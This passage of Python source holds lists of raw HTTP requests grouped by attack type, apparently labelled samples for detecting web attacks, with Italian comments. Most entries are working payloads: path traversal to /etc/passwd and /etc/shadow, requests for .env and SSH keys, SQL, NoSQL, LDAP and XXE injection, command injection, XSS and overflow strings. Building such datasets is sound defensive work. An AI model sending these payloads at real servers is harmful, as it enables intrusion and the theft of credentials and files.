    """10.0.0.5 GET /..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: testsite.com
User-Agent: curl/7.68.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7
Accept-Language: en-US
Connection: close
""",
    """172.16.0.2 GET /images/../../../etc/shadow HTTP/1.1
Host: vulnerable.com
User-Agent: Wget/1.20.3
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT,it;q=0.8
Connection: keep-alive
""",
    """203.0.113.8 GET /download?file=../../../../etc/hosts HTTP/1.1
Host: webmail.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
""",
    """192.168.100.20 GET /view.php?page=../../../../boot.ini HTTP/1.1
Host: iotdevice.local
User-Agent: python-requests/2.25.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
""",
    """10.10.10.10 GET /?file=..\\..\\windows\\win.ini HTTP/1.1
Host: apisite.com
User-Agent: PostmanRuntime/7.26.8
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """172.16.1.1 GET /../../../../../../../../etc/group HTTP/1.1
Host: mysite.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR,fr;q=0.9
Connection: keep-alive
""",
    """192.0.2.1 GET /data/..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts HTTP/1.1
Host: demo.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES,es;q=0.8
Connection: close
""",
    """198.51.100.2 GET /index.php?path=../../../../../../etc/passwd HTTP/1.1
Host: formsite.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE,de;q=0.8
Connection: keep-alive
""",
    """203.0.113.9 GET /../../../../var/log/auth.log HTTP/1.1
Host: submit.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """192.168.1.11 GET /admin/../../../../etc/ssh/sshd_config HTTP/1.1
Host: admin.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """10.0.0.6 GET /files?name=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: files.com
User-Agent: curl/7.80.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
""",
    """172.16.0.3 GET /../../../../../../../../etc/issue HTTP/1.1
Host: corp.com
User-Agent: Wget/1.21.1
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT
Connection: keep-alive
""",
    """203.0.113.10 GET /download.php?doc=..\\..\\..\\..\\boot.ini HTTP/1.1
Host: download.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB
Connection: keep-alive
""",
    """192.168.100.21 GET /../../../../../../../../etc/hostname HTTP/1.1
Host: iot2.local
User-Agent: python-requests/2.28.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
""",
    """10.10.10.11 GET /view?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1
Host: apisite2.com
User-Agent: PostmanRuntime/7.29.0
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """172.16.1.2 GET /../../../../../../../../etc/cron.d HTTP/1.1
Host: shellsite.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR
Connection: keep-alive
""",
    """192.0.2.2 GET /../../../../../../../../root/.bashrc HTTP/1.1
Host: demo2.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES
Connection: close
""",
    """198.51.100.3 GET /api?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1
Host: formsite2.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE
Connection: keep-alive
""",
    """203.0.113.10 GET /../../../../../../../../etc/mysql/my.cnf HTTP/1.1
Host: submit2.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
""",
    """192.168.1.12 GET /../../../../../../../../var/www/html/index.php HTTP/1.1
Host: webroot.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
"""]
infodisclosure = ["""
10.20.30.40
GET /.git/config HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /robots.txt HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /api/users/12345 HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /search?q=%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20 HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /static/app.js HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: application/javascript
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /images/ HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
    # Directory listing
    """192.168.1.10 GET / HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
""",

    # Accesso a file di configurazione
    """10.0.0.5 GET /.env HTTP/1.1
Host: testsite.com
User-Agent: curl/7.68.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Connection: close
""",

    # Accesso a file di backup
    """172.16.0.2 GET /config.php.bak HTTP/1.1
Host: vulnerable.com
User-Agent: Wget/1.20.3
Accept: text/html
Accept-Encoding: gzip
Connection: keep-alive
""",

    # Stack trace in risposta a input errato
    """203.0.113.8 GET /search?query=%25 HTTP/1.1
Host: webmail.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Connection: keep-alive
""",

    # Accesso a file di log
    """192.168.100.20 GET /logs/error.log HTTP/1.1
Host: iotdevice.local
User-Agent: python-requests/2.25.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
""",

    # Accesso a file di database SQLite
    """10.10.10.10 GET /db.sqlite3 HTTP/1.1
Host: apisite.com
User-Agent: PostmanRuntime/7.26.8
Accept: application/octet-stream
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
""",

    # Accesso a file di password
    """172.16.1.1 GET /admin/passwords.txt HTTP/1.1
Host: mysite.org
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip
Connection: keep-alive
""",

    # Accesso a file di chiavi private
    """192.0.2.1 GET /.ssh/id_rsa HTTP/1.1
Host: demo.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: br
Connection: close
""",

    # Debug attivo
    """198.51.100.2 GET /debug HTTP/1.1
Host: formsite.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
""",

    # Accesso a file di configurazione Apache
    """203.0.113.9 GET /.htaccess HTTP/1.1
Host: submit.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
""",
    # Accesso a file di configurazione in sottocartella
    """192.168.1.20 GET /config/.env HTTP/1.1
Host: example2.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
""",

    # Accesso a file di backup con estensione diversa
    """10.0.0.15 GET /admin/config.old HTTP/1.1
Host: testsite2.com
User-Agent: curl/7.80.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Connection: close
""",

    # Accesso a file di log in directory diversa
    """172.16.0.22 GET /var/log/app.log HTTP/1.1
Host: vulnerable2.com
User-Agent: Wget/1.21.1
Accept: text/html
Accept-Encoding: gzip
Connection: keep-alive
""",

    # Stack trace tramite POST con input errato
    """203.0.113.18 POST /api/search HTTP/1.1
Host: webmail2.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Connection: keep-alive
Content-Type: application/json
Content-Length: 20

{"query": "%zzzz"}
""",

    # Accesso a file di chiavi pubbliche
    """192.168.100.30 GET /.ssh/id_rsa.pub HTTP/1.1
Host: iotdevice2.local
User-Agent: python-requests/2.28.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
""",

    # Accesso a file di configurazione Nginx
    """10.10.10.20 GET /etc/nginx/nginx.conf HTTP/1.1
Host: apisite2.com
User-Agent: PostmanRuntime/7.29.0
Accept: application/octet-stream
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
""",

    # Directory listing in sottocartella
    """172.16.1.12 GET /uploads/ HTTP/1.1
Host: mysite2.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Connection: keep-alive
""",

    # Accesso a file di dump del database
    """192.0.2.12 GET /backup/db_dump.sql HTTP/1.1
Host: demo2.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: br
Connection: close
""",

    # Debug mode attivo tramite parametro
    """198.51.100.12 GET /app?debug=true HTTP/1.1
Host: formsite2.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
""",

    # Accesso a file di configurazione PHP
    """203.0.113.19 GET /phpinfo.php HTTP/1.1
Host: submit2.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
"""]
injection = ["""
10.20.30.40
POST /login HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=admin'--&password=...
""",
"""
10.20.30.40
GET /product?id=1%27%20AND%201%3D1--%20 HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /contact_form HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=test@example.com&message=hello%20there%20%3B%20whoami
""",
"""
10.20.30.40
GET /test HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
X-Custom-Header: malicious_data%0aContent-Length:0%0aHTTP/1.1 200 OK
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /login HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

user=*)(cn=admin))%00&pass=password
""",
"""
10.20.30.40
POST /login.aspx HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

username=' or '1'='1&password=' or '1'='1
""",
"""
10.20.30.40
POST /api/process_xml HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/xml
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/xml
Content-Length: 100

<?xml version="1.0" encoding="ISO-8859-1"?>
<user><name>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;</name></user>
""",
"""
10.20.30.40
POST /api/login HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 50

{"username": {"$gt": ""}, "password": {"$ne": null}}
""",
"""
10.20.30.40
GET /index.php?func=shell_exec&cmd=whoami HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /image_download?url=https://legit.com/image.jpg|whoami HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
    # SQL Injection
    """192.168.1.10 GET /login?user=admin'--&pass= HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",

    # Command Injection (Linux)
    """10.0.0.5 POST /ping HTTP/1.1
Host: testsite.com
User-Agent: curl/7.68.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7
Accept-Language: en-US
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

host=127.0.0.1;cat /etc/passwd
""",

    # LDAP Injection
    """172.16.0.2 GET /search?user=*)(uid=*))(|(uid=* HTTP/1.1
Host: vulnerable.com
User-Agent: Wget/1.20.3
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT,it;q=0.8
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""",

    # XPath Injection
    """203.0.113.8 GET /xml?user=admin' or '1'='1 HTTP/1.1
Host: webmail.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",

    # XML Injection
    """192.168.100.20 POST /api/xml HTTP/1.1
Host: iotdevice.local
User-Agent: python-requests/2.25.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
Content-Type: application/xml
Content-Length: 80

<user><name>admin</name><role><![CDATA[</role><role>admin</role>]]></role></user>
""",

    # NoSQL Injection (MongoDB)
    """10.10.10.10 GET /user?name[$ne]=&password[$ne]= HTTP/1.1
Host: apisite.com
User-Agent: PostmanRuntime/7.26.8
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""",

    # Shell Injection (Windows)
    """172.16.1.1 POST /run HTTP/1.1
Host: mysite.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR,fr;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

cmd=dir & type C:\\Windows\\System32\\drivers\\etc\\hosts
""",

    # HTML Injection
    """192.0.2.1 GET /profile?bio=<b>Injected!</b> HTTP/1.1
Host: demo.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES,es;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",

    # JavaScript Injection
    """198.51.100.2 GET /search?q=</script><script>alert('js')</script> HTTP/1.1
Host: formsite.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE,de;q=0.8
Connection: keep-alive
Content-Type: text/plain
Content-Length: 0
""",

    # PHP Injection
    """203.0.113.9 GET /index.php?page=php://input HTTP/1.1
Host: submit.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",
    # SQL Injection con UNION
    """192.168.1.11 GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1
Host: shop.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",

    # Command Injection con pipe
    """10.0.0.6 POST /admin HTTP/1.1
Host: adminsite.com
User-Agent: curl/7.80.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

action=ping|ls /var/www
""",

    # LDAP Injection con filtro alternativo
    """172.16.0.3 GET /auth?user=*)(objectClass=*) HTTP/1.1
Host: corp.com
User-Agent: Wget/1.21.1
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""",

    # XPath Injection con doppio apice
    """203.0.113.10 GET /xml?user=' or ''=' HTTP/1.1
Host: xmlsite.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",

    # XML Injection con tag chiuso male
    """192.168.100.21 POST /api/xml HTTP/1.1
Host: iot2.local
User-Agent: python-requests/2.28.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
Content-Type: application/xml
Content-Length: 90

<user><name>admin</name><role></role><role>admin</role></user>
""",

    # NoSQL Injection con $gt
    """10.10.10.11 GET /user?age[$gt]=0 HTTP/1.1
Host: apisite.com
User-Agent: PostmanRuntime/7.29.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""",

    # Shell Injection con backtick
    """172.16.1.2 POST /run HTTP/1.1
Host: shellsite.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

cmd=echo vulnerable && whoami
""",

    # HTML Injection con tag script
    """192.0.2.2 GET /profile?bio=<script>document.body.innerHTML='hacked'</script> HTTP/1.1
Host: demo2.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",

    # JavaScript Injection con onmouseover
    """198.51.100.3 GET /search?q=<img src=x onmouseover=alert('js2')> HTTP/1.1
Host: formsite2.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE
Connection: keep-alive
Content-Type: text/plain
Content-Length: 0
""",

    # PHP Injection con include
    """203.0.113.10 GET /index.php?page=../../../../etc/passwd HTTP/1.1
Host: submit2.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
"""]
overflow= ["""
10.20.30.40
POST /api/authenticate HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 100
Connection: keep-alive

username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
""",
"""
10.20.30.40
POST /login HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

user=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
""",
"""
10.20.30.40
POST /log_event HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

log_message=%s%s%s%s%s%s%s%s%s
""",
"""
10.20.30.40
POST /allocate_memory HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

size=4294967295
""",
"""
10.20.30.40
POST /parse_config HTTP/1.1
Host: appserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 500

{"key": "value", "long_string": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}
""",
"""
10.20.30.40
GET /api/status?param=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: appserver.example.com
User-Agent: curl/7.64.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET / HTTP/1.1
Host: appserver.example.com
User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
    # Stringa molto lunga in parametro GET
    """192.168.1.10 GET /login?user={} HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""".format("A"*5000),

    # Stringa molto lunga in header User-Agent
    """10.0.0.5 GET / HTTP/1.1
Host: testsite.com
User-Agent: {}
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7
Accept-Language: en-US
Connection: close
Content-Type: text/plain
Content-Length: 0
""".format("B"*4000),

    # Numeri molto grandi in parametro
    """172.16.0.2 GET /calc?value={} HTTP/1.1
Host: vulnerable.com
User-Agent: Wget/1.20.3
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT,it;q=0.8
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""".format("9"*2000),

    # Body POST con stringa lunga
    """203.0.113.8 POST /upload HTTP/1.1
Host: webmail.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6000

{}
""".format("C"*6000),

    # Parametro multiplo con stringa e numeri
    """192.168.100.20 GET /home?data={}&id={} HTTP/1.1
Host: iotdevice.local
User-Agent: python-requests/2.25.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
Content-Type: text/html
Content-Length: 0
